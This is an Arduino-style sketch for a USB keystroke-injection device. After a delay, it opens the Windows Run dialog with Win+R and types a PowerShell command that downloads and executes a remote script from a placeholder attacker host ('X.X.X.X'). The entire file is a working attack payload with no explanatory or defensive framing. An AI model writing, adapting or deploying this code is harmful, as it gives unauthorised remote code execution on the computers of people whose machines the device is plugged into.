void setup() {
  delay(10000);
  omg("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:P/A.ps1')\"");
  delay(500);
}

void loop() {
}

void omg(char *SomeCommand)
{
  Keyboard.set_modifier(128); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
